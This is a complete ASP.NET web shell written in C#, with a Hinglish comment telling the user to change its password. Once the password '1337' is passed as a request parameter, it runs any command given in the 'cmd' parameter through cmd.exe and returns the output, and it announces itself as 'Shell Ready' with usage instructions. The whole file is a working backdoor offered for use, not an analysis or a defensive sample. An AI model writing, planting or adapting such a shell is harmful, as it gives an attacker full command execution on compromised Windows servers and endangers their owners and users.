<%@ Page Language="C#" %>
<%
    string pass = "1337";   // ← Yahan apna strong password change kar lo

    if (Request["p"] != pass) 
    { 
        Response.Write("Access Denied");
        Response.End(); 
    }

    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        try
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        }
        catch (Exception ex)
        {
            Response.Write("<pre>Error: " + Server.HtmlEncode(ex.Message) + "</pre>");
        }
    }
    else
    {
        Response.Write("<h3>Shell Ready - Use ?p=1337&cmd=yourcommand</h3>");
    }
%>
